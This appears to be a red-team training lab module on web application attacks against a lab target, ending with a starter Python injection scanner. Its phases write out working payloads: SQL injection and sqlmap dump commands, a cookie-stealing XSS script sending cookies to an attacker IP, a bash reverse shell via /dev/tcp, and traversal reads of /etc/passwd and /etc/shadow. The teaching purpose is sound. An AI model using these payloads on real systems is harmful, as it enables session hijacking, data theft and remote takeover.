## 📖 Background

Web application vulnerabilities consistently top the list of most exploited attack vectors. The OWASP Top 10 categorizes the most critical web application security risks, and understanding them is essential for any red team operator. Most web attacks exploit a common theme: the application trusts user input without proper validation or sanitization.

Key concepts:
- **Injection** — Untrusted data sent to an interpreter as part of a command or query
- **Broken Authentication** — Flaws that allow attackers to compromise identity functions
- **XSS (Cross-Site Scripting)** — Injecting client-side scripts into web pages viewed by others
- **CSRF (Cross-Site Request Forgery)** — Forcing authenticated users to perform unintended actions
- **Directory Traversal** — Accessing files outside the intended directory using path manipulation
- **IDOR (Insecure Direct Object Reference)** — Accessing objects by manipulating identifiers

## 🔬 Lab Instructions

### Phase 1: HTTP Interception and Analysis

1. Configure your browser to proxy through Burp Suite (127.0.0.1:8080)
2. Browse the GRIMOIRE target web application and observe traffic in Burp
3. Examine request methods, headers, cookies, and parameters:
   ```
   GET /search?q=test HTTP/1.1
   Host: grimoire-target.lab
   Cookie: session=abc123
   ```
4. Use Burp Repeater to modify and resend requests manually
5. Identify all input points: URL parameters, form fields, headers, cookies
6. Map the application structure using Burp Site Map or manual crawling

### Phase 2: SQL Injection

1. Identify a potential SQL injection point (e.g., login form or search):
   ```
   GET /search?q=test' HTTP/1.1
   ```
2. Test for error-based injection by injecting a single quote and observing errors
3. Confirm injection with boolean-based tests:
   ```
   /search?q=test' AND 1=1--    (returns results)
   /search?q=test' AND 1=2--    (returns nothing)
   ```
4. Extract data using UNION-based injection:
   ```
   /search?q=test' UNION SELECT NULL,username,password FROM users--
   ```
5. Automate extraction with sqlmap:
   ```bash
   sqlmap -u "http://grimoire-target.lab/search?q=test" --dbs
   sqlmap -u "http://grimoire-target.lab/search?q=test" -D webapp --tables
   sqlmap -u "http://grimoire-target.lab/search?q=test" -D webapp -T users --dump
   ```
6. Document extracted data and the injection technique used

### Phase 3: Cross-Site Scripting (XSS)

1. Test for reflected XSS by injecting script tags:
   ```
   /search?q=<script>alert('XSS')</script>
   ```
2. If basic tags are filtered, try bypass techniques:
   ```
   /search?q=<img src=x onerror=alert('XSS')>
   /search?q=<svg onload=alert('XSS')>
   ```
3. Test for stored XSS in comment fields or profile pages
4. Craft a cookie-stealing payload:
   ```html
   <script>new Image().src="http://10.10.10.5:8000/?c="+document.cookie;</script>
   ```
5. Set up a listener to capture exfiltrated data:
   ```bash
   python3 -m http.server 8000
   ```
6. Demonstrate impact: session hijacking through stolen cookies

### Phase 4: Command Injection and Directory Traversal

1. Identify an input that interacts with the OS (e.g., ping utility, file viewer):
   ```
   POST /admin/ping
   host=10.10.10.1; whoami
   ```
2. Test for command injection using various separators:
   ```
   10.10.10.1; id
   10.10.10.1 | id
   10.10.10.1 && id
   10.10.10.1 `id`
   10.10.10.1 $(id)
   ```
3. Escalate to a reverse shell through command injection:
   ```
   host=10.10.10.1; bash -c 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1'
   ```
4. Test for directory traversal in file parameters:
   ```
   /view?file=../../../../etc/passwd
   /download?path=....//....//etc/shadow
   ```
5. Extract sensitive files: configuration files, database credentials, SSH keys

### Phase 5: Authentication Bypass and Chaining

1. Test for IDOR by changing user IDs in requests:
   ```
   /api/user/1001  →  /api/user/1002
   ```
2. Test for authentication bypass via parameter manipulation:
   ```
   POST /login
   username=admin&password=anything&role=admin
   ```
3. Attempt CSRF by crafting a malicious form that targets an authenticated action
4. Chain vulnerabilities: use SQL injection to extract admin credentials, then XSS to hijack an active session
5. Document the full attack chain with evidence at each step

## 🛠️ Build Your Own

**Build Objective:** Create a custom web vulnerability scanner focusing on injection detection

### Requirements
- Accepts a target URL and parameter list
- Tests for SQL injection, XSS, and command injection
- Reports findings with severity and evidence
- Respects scope boundaries and rate limits

### Starter Framework
```python
#!/usr/bin/env python3
"""GRIMOIRE Web Vuln Scanner - LAB-012 Build Your Own"""

import requests
import sys
import urllib.parse
from datetime import datetime

class WebVulnScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "GRIMOIRE-Scanner/1.0"})

    def test_sqli(self, param):
        """Test a parameter for SQL injection vulnerabilities."""
        sqli_payloads = [
            "'", "' OR '1'='1", "' OR '1'='1'--",
            "1' ORDER BY 1--", "' UNION SELECT NULL--"
        ]
        error_signatures = [
            "sql syntax", "mysql_fetch", "ORA-01756",
            "SQLite3::", "pg_query", "unclosed quotation"
        ]
        # TODO: Inject each payload and check for error signatures
        for payload in sqli_payloads:
            test_url = self._inject_param(param, payload)
            try:
                resp = self.session.get(test_url, timeout=10)
                for sig in error_signatures:
                    if sig.lower() in resp.text.lower():
                        self._add_finding("SQL Injection", param, payload, "HIGH")
                        return True
            except requests.RequestException:
                continue
        return False

    def test_xss(self, param):
        """Test a parameter for cross-site scripting."""
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'\"><svg onload=alert(1)>"
        ]
        # TODO: Inject payloads and check if they appear unescaped in response
        for payload in xss_payloads:
            test_url = self._inject_param(param, payload)
            try:
                resp = self.session.get(test_url, timeout=10)
                if payload in resp.text:
                    self._add_finding("Cross-Site Scripting", param, payload, "HIGH")
                    return True
            except requests.RequestException:
                continue
        return False

    def test_cmdi(self, param):
        """Test a parameter for command injection."""
        cmdi_payloads = [
            "; echo grimoire_cmdi_test",
            "| echo grimoire_cmdi_test",
            "$(echo grimoire_cmdi_test)"
        ]
        # TODO: Inject OS command payloads and check for marker in response
        for payload in cmdi_payloads:
            test_url = self._inject_param(param, payload)
            try:
                resp = self.session.get(test_url, timeout=10)
                if "grimoire_cmdi_test" in resp.text:
                    self._add_finding("Command Injection", param, payload, "CRITICAL")
                    return True
            except requests.RequestException:
                continue
        return False

    def _inject_param(self, param, payload):
        """Build a URL with the payload injected into the given parameter."""
        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _add_finding(self, vuln_type, param, payload, severity):
        """Record a vulnerability finding."""
        self.findings.append({
            "type": vuln_type,
            "parameter": param,
            "payload": payload,
            "severity": severity,
            "url": self.target_url,
            "timestamp": datetime.now().isoformat()
        })
        print(f"  [!] {severity}: {vuln_type} in '{param}' parameter")

    def scan(self, params):
        """Run all tests against the specified parameters."""
        print(f"[+] Scanning {self.target_url}")
        for param in params:
            print(f"[*] Testing parameter: {param}")
            self.test_sqli(param)
            self.test_xss(param)
            self.test_cmdi(param)
        self.report()

    def report(self):
        """Print a summary of all findings."""
        print(f"\n{'='*50}")
        print(f"Scan Complete — {len(self.findings)} finding(s)")
        for f in self.findings:
            print(f"  [{f['severity']}] {f['type']} → {f['parameter']}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 web_scanner.py <url_with_params> <param1,param2,...>")
        sys.exit(1)
    scanner = WebVulnScanner(sys.argv[1])
    params = sys.argv[2].split(",")
    scanner.scan(params)
```

- [ ] XSS detection identifies reflected payloads in responses
- [ ] Command injection detection uses safe marker strings
- [ ] Findings include severity, parameter, and evidence
- [ ] Scanner respects timeouts and handles errors gracefully
